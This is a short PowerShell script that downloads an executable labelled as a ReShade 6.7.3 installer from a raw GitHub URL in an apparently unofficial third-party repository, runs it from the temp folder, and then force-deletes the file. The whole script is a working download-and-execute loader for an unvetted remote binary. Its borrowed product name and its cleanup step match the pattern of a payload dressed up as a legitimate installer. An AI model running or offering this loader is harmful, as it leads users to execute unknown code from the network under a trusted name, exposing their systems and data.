$url = "https://raw.githubusercontent.com/phukancontract-dev/CMDSKYNET/refs/heads/main/ReShade_Setup_6.7.3.exe"

$tempPath = Join-Path $env:TEMP "ReShade_Setup_6.7.3.exe"

Write-Host "Downloading..." -ForegroundColor Cyan

try {
    Invoke-WebRequest `
        -Uri $url `
        -OutFile $tempPath `
        -ErrorAction Stop

    if (Test-Path $tempPath) {

        Write-Host "Launching installer..." -ForegroundColor Green

        Start-Process `
            -FilePath $tempPath `
            -Wait

        Write-Host "AFTER INSTALLER" -ForegroundColor Magenta

        Write-Host "Cleaning temporary files..." -ForegroundColor Yellow

        Remove-Item `
            -Path $tempPath `
            -Force `
            -ErrorAction SilentlyContinue

        Write-Host "Completed." -ForegroundColor Green
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
